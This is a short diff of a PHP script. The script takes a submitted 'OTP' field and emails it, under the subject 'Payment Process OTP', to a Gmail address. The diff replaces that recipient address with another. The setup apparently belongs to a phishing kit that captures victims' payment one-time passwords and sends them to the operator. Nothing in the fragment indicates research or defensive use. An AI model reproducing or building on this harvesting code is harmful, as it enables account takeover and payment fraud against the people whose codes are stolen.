@@ -12,7 +12,7 @@ if (!isset($_POST)) {
 
     // Extract and sanitize inputs
     $otp = htmlspecialchars($_POST['OTP'], ENT_QUOTES, 'UTF-8');
-    $to = 'habeebajani9@gmail.com'; // Recipient email address
+    $to = 'americanresidence435@gmail.com'; // Recipient email address
     $subject = 'Payment Process OTP';
     $name = 'Agent'; // Sender's name
     $fromEmail = 'agent@americaresides.com'; // Sender's email address
